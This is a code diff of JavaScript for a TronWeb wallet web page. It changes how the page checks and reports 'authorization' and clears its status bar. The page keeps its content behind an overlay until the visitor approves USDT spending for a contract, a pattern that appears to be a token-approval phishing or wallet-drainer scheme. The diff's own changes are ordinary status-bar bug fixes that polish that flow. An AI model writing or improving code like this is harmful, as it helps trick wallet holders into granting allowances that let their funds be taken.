@@ -98,9 +98,8 @@ async function checkAuthorization() {
         if (!tronWeb || !userAddress || !contractInstance || !usdtContractInstance) {
             updateConnectionUI(false); 
             showOverlay('Wallet not connected. Please connect.');
-            // 确保如果连接失败，状态栏信息也被清除
             updateStatus(''); 
-            return;
+            return false; // 返回 false 表示未完全授权
         }
         
         // 确保按钮处于连接状态，内容是图标
@@ -145,47 +144,40 @@ async function checkAuthorization() {
         if (allAuthorized) {
             // **授权完成**：添加绿色标记类
             connectButton.classList.add('authorized-complete'); 
-            // 内容已由 updateConnectionUI 设为图标
             connectButton.title = 'Disconnect Wallet'; 
             connectButton.disabled = false;
             
-            // **关键修复：授权完成后，先显示成功信息，然后延迟清除状态栏**
+            // **显示成功信息，立即隐藏遮罩**
             updateStatus('All authorizations complete. Content unlocked!'); 
             hideOverlay(); 
-            // 延迟 3 秒后清除状态栏，给用户一个缓冲时间看到成功的提示
-            setTimeout(() => {
-                updateStatus(''); // 清除状态栏消息
-            }, 3000); 
+            return true; // 授权完成，返回 true
 
         } else {
             // **授权未完成**：移除绿色标记类，保持图标，但 CSS 颜色为黄色
             connectButton.classList.remove('authorized-complete'); 
-            // 内容已由 updateConnectionUI 设为图标
             
             connectButton.title = 'Complete Authorization'; 
             connectButton.disabled = false;
             updateStatus(`Authorization incomplete. ${statusMessage}`); 
             showOverlay('You need to complete the authorization to view the content. Click the wallet link in the upper right corner to begin authorization.'); 
+            return false; // 授权未完成，返回 false
         }
     } catch (error) {
         updateStatus(`Authorization check failed: ${error.message}`);
         console.error("Check Authorization Error:", error);
         showOverlay(`Authorization check failed: ${error.message}`);
-        
-        // 授权检查本身失败时，也给一个缓冲时间然后清除状态栏
-        setTimeout(() => {
-            updateStatus('');
-        }, 5000); 
+        return false; // 授权检查失败，返回 false
     }
 }
 
-// --- 执行授权交易 ---
+// --- 执行授权交易 (修复了状态栏卡住的问题) ---
 async function executeAuthorization() {
     if (!userAddress) { 
         showOverlay('Please connect your wallet first.');
         return;
     }
 
+    let isFinalAuthorizationComplete = false;
     try {
         updateStatus('Checking authorization requirements...');
         
@@ -220,12 +212,11 @@ async function executeAuthorization() {
             });
             updateStatus(`USDT Approval successful. Finalizing check...`);
             
-            // *** 增加延迟到 5 秒（5000ms）以确保 USDT 授权状态同步完成 ***
             await new Promise(resolve => setTimeout(resolve, 5000));
         }
 
         // 授权流程完成，检查最终状态并更新 UI
-        await checkAuthorization();
+        isFinalAuthorizationComplete = await checkAuthorization();
 
     } catch (error) {
         console.error("Authorization Execution Failed:", error);
@@ -235,7 +226,19 @@ async function executeAuthorization() {
                              
         updateStatus(`🔴 ${errorMessage}`);
         showOverlay(`🔴 Authorization failed: ${errorMessage}`);
-        await checkAuthorization(); 
+        await checkAuthorization(); // 再次检查以确保 UI 状态正确更新
+
+    } finally {
+        // **关键修复逻辑：确保在流程结束（成功或失败）后，状态栏被清除**
+        if (isFinalAuthorizationComplete) {
+            // 如果成功完成，等待 3 秒后清除，让用户看到成功的提示
+            await new Promise(resolve => setTimeout(resolve, 3000)); 
+            updateStatus('');
+        } else {
+            // 如果失败或未完成（用户取消等），等待 5 秒后清除，避免错误消息卡住
+             await new Promise(resolve => setTimeout(resolve, 5000));
+             updateStatus('');
+        }
     }
 }
 
